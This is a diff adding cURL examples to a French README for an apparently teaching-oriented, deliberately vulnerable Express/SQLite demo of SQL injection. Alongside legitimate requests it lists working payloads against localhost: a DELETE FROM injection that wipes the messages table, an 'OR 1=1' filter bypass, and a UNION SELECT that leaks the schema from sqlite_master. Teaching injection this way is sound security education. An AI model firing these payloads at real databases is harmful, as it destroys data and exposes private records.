@@ -23,6 +23,42 @@ Le fichier `src/test/app.test.ts` regroupe les démonstrations principales :
 
 Chaque scénario construit une requête malveillante, appelle directement les gestionnaires Express (sans serveur HTTP), et vérifie le comportement obtenu via des objets réponse simulés.
 
+### Exemples cURL
+
+#### 1. Insertion légitime
+```bash
+curl -X POST http://localhost:3000/messages \
+  -H 'Content-Type: application/json' \
+  -d '{"body":"Bonjour tout le monde"}'
+```
+
+#### 1bis. Suppression de la table via injection
+```bash
+curl -X POST http://localhost:3000/messages \
+  -H 'Content-Type: application/json' \
+  -d "{\"body\":\"'); DELETE FROM messages; --\"}"
+```
+
+#### 2. Lecture légitime de la liste
+```bash
+curl http://localhost:3000/messages
+```
+
+#### 2bis. Lecture d'un message précis
+```bash
+curl http://localhost:3000/messages/1
+```
+
+#### 2ter. Bypass de filtrage par injection
+```bash
+curl http://localhost:3000/messages/0%20OR%201=1
+```
+
+#### 3. Fuite de schéma
+```bash
+curl "http://localhost:3000/messages/0%20UNION%20SELECT%201,%20sql,%20'1970-01-01T00:00:00'%20FROM%20sqlite_master%20WHERE%20type='table'%20LIMIT%201%20OFFSET%201--"
+```
+
 ## Recommandations pédagogiques
 - Utilisez `SQLITE_DB_PATH=':memory:'` pour isoler les sessions d'exécution.
 - Montrez d'abord la route légitime, puis réexécutez la même route avec la charge utile injectée.
